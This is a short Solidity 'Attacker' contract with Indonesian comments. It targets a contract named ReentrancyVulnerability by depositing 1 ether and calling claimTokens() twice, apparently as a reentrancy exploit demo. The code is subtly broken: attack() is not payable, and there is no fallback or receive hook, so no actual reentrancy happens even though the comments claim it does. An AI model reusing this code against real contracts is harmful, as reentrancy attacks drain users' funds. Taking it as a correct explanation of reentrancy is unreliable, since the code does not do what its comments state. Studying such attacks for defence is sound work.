pragma solidity ^0.8.9;
contract Attacker {
    ReentrancyVulnerability public vulnerability;

    constructor(ReentrancyVulnerability _vulnerability) {
        vulnerability = _vulnerability;
    }

    function attack() public {
        vulnerability.deposit{value: 1 ether}();
        // Mencoba memanggil claimTokens sebelum transfer selesai
        (bool sent, ) = payable(address(vulnerability)).call(abi.encodeWithSignature("claimTokens()"));
        // Mencoba memanggil claimTokens lagi sebelum transfer selesai
        (bool sent2, ) = payable(address(vulnerability)).call(abi.encodeWithSignature("claimTokens()"));
    }
}
